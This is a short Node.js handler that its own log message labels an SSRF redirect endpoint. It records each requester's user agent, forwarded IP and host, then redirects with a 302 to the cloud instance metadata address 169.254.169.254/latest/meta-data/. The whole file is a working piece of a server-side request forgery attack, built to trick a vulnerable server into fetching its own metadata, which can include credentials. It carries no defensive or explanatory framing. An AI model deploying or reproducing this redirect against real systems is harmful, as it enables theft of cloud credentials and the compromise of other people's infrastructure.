module.exports = (req, res) => {
  console.log("Incoming request to SSRF redirect endpoint");
  console.log("UA:", req.headers["user-agent"]);
  console.log("IP:", req.headers["x-forwarded-for"]);
  console.log("Host:", req.headers["host"]);

  res.statusCode = 302;
  res.setHeader(
    "Location",
    "http://169.254.169.254/latest/meta-data/"
  );
  res.end("Redirecting...");
};
